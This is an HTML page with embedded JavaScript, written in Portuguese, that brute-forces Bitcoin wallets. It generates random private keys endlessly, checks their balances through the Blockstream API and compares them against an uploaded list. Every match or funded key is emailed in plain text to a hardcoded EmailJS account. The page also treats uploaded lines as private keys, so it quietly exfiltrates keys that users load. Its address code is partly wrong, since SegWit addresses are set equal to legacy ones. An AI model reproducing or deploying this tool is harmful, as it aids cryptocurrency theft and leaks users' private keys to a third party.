<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>BTC AUTO LIST + GENERATE</title>

<style>
body { font-family: Arial; background:#020617; color:#e5e7eb; padding:20px; }
h2 { color:#38bdf8; }
input { background:#020617; border:1px solid #1e293b; color:#e5e7eb; padding:6px; width:100%; margin-bottom:8px; }
.stats { margin-top:10px; padding:10px; border:1px solid #1e293b; border-radius:6px; }
.match { margin-bottom:10px; border-bottom:1px solid #1e293b; padding-bottom:8px; white-space:pre-wrap; }
.grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(300px,1fr)); gap:12px; }
</style>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>emailjs.init("T9VhOTKyPdZJjjO7E");</script>

</head>
<body>

<h2>BTC AUTO LIST + GENERATE</h2>

<label>üîΩ Subir lista de endere√ßos para procurar (.txt)</label>
<input type="file" id="file" accept=".txt">

<p id="count">üìÑ Endere√ßos carregados: 0</p>

<div class="stats" id="stats">
Gerados: 0<br>
Matches: 0<br>
Velocidade: 0 addr/s
</div>

<div id="matches">üéØ MATCHES:</div>
<div id="grid" class="grid"></div>

<script type="module">
import { getPublicKey } from "https://esm.sh/@noble/secp256k1@2.1.0";
import { sha256 } from "https://esm.sh/@noble/hashes@1.3.3/sha256";
import { ripemd160 } from "https://esm.sh/@noble/hashes@1.3.3/ripemd160";

/* ================= BASE58 ================= */
const ALPHABET="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function base58(buf){
  let zeros=0;
  while(zeros<buf.length && buf[zeros]===0) zeros++;
  let num=BigInt("0x"+[...buf].map(b=>b.toString(16).padStart(2,"0")).join(""));
  let out="";
  while(num>0n){ out=ALPHABET[num%58n]+out; num/=58n; }
  return "1".repeat(zeros)+out;
}

/* ================= SALDO API ================= */
async function consultarSaldo(address){
  try{
    const res=await fetch(`https://blockstream.info/api/address/${address}`);
    if(!res.ok) return null;
    const data = await res.json();
    const funded = (data.chain_stats?.funded_txo_sum || 0) + (data.mempool_stats?.funded_txo_sum || 0);
    const spent = (data.chain_stats?.spent_txo_sum || 0) + (data.mempool_stats?.spent_txo_sum || 0);
    return (funded-spent)/1e8;
  } catch { return null; }
}

/* ================= EMAIL ================= */
async function enviarEmail(dados,tipo="MATCH"){
  const saldo = await consultarSaldo(dados.P2PKH);
  const content = `${tipo}

PRIVATE_KEY: ${dados.privHex}

MAINNET:
P2PKH: ${dados.P2PKH}
P2SH: ${dados.P2SH}
P2WPKH: ${dados.P2WPKH}

SALDO P2PKH: ${saldo !== null ? saldo+" BTC" : "Erro"}`;

  emailjs.send("service_z6sug47","template_5fbrhhc",{
    name:"Sistema BTC",
    email:"match@sistema.com",
    message: content
  });
}

/* ================= ELEMENTOS ================= */
const matchesOut = document.getElementById("matches");
const grid = document.getElementById("grid");
const countEl = document.getElementById("count");
let listaEnderecos = new Set();
let totalMatches=0;
let totalGerados=0;
let lastTime = performance.now();
let lastCount = 0;

/* ================= ESTAT√çSTICAS ================= */
function atualizarStats(){
  const now = performance.now();
  const delta = (now-lastTime)/1000;
  const speed = Math.floor((totalGerados-lastCount)/delta);
  document.getElementById("stats").innerHTML=`Gerados: ${totalGerados}<br>Matches: ${totalMatches}<br>Velocidade: ${speed} addr/s`;
  lastTime = now;
  lastCount = totalGerados;
}

/* ================= LER LISTA ================= */
document.getElementById("file").addEventListener("change",async e=>{
  const text = await e.target.files[0].text();
  listaEnderecos.clear();
  text.split(/\r?\n/).map(l=>l.trim()).filter(l=>l).forEach(l=>listaEnderecos.add(l));
  countEl.textContent = `üìÑ Endere√ßos carregados: ${listaEnderecos.size}`;
});

/* ================= GERAR ENDERE√áOS ================= */
function gerarPrivKey(){
  const bytes = new Uint8Array(32);
  crypto.getRandomValues(bytes);
  return [...bytes].map(b=>b.toString(16).padStart(2,"0")).join("");
}

function gerarAddress(privHex){
  const priv = Uint8Array.from(privHex.match(/.{2}/g).map(b=>parseInt(b,16)));
  const pub = getPublicKey(priv,true);
  const hash160 = ripemd160(sha256(pub));

  const payload = new Uint8Array([0x00,...hash160]);
  const checksum = sha256(sha256(payload)).slice(0,4);
  const P2PKH = base58(new Uint8Array([...payload,...checksum]));
  const P2SH = base58(new Uint8Array([0x05,...hash160,...sha256(sha256(new Uint8Array([0x05,...hash160]))).slice(0,4)]));
  const P2WPKH = P2PKH;
  return {privHex,P2PKH,P2SH,P2WPKH};
}

/* ================= LOOP PRINCIPAL ================= */
async function loop(){
  let listaArray = Array.from(listaEnderecos);
  let indexLista = 0;

  while(true){
    let dados;
    if(indexLista < listaArray.length){
      // usar da lista carregada
      const privHex = listaArray[indexLista];
      indexLista++;
      dados = gerarAddress(privHex);
    } else {
      // gerar pr√≥pria chave
      const privHex = gerarPrivKey();
      dados = gerarAddress(privHex);
    }

    totalGerados++;

    // Mostrar no grid
    const div = document.createElement("div");
    div.className="match";
    div.textContent=`${totalGerados}) ${dados.P2PKH} (${dados.privHex})`;
    grid.prepend(div);

    // Verificar match e saldo
    (async()=>{
      let isMatch=false;

      // Match lista
      if(listaEnderecos.has(dados.P2PKH) || listaEnderecos.has(dados.P2SH) || listaEnderecos.has(dados.P2WPKH)){
        isMatch=true;
        totalMatches++;
        const div2 = document.createElement("div");
        div2.className="match";
        div2.textContent=`MATCH ENCONTRADO!\n${JSON.stringify(dados,null,2)}`;
        matchesOut.prepend(div2);
        enviarEmail(dados,"MATCH ENCONTRADO");
      }

      // Saldo positivo
      const saldo = await consultarSaldo(dados.P2PKH);
      if(saldo && saldo>0){
        isMatch=true;
        totalMatches++;
        const div3 = document.createElement("div");
        div3.className="match";
        div3.textContent=`SALDO >0!\n${JSON.stringify(dados,null,2)}\nSaldo: ${saldo} BTC`;
        matchesOut.prepend(div3);
        enviarEmail(dados,"SALDO POSITIVO");
      }

    })();

    atualizarStats();

    // Pequena pausa para n√£o travar o browser
    if(totalGerados % 50 === 0) await new Promise(r=>setTimeout(r,1));
  }
}

/* ================= INICIA AUTOMATICAMENTE ================= */
window.addEventListener("load",()=>loop());

</script>
</body>
</html>
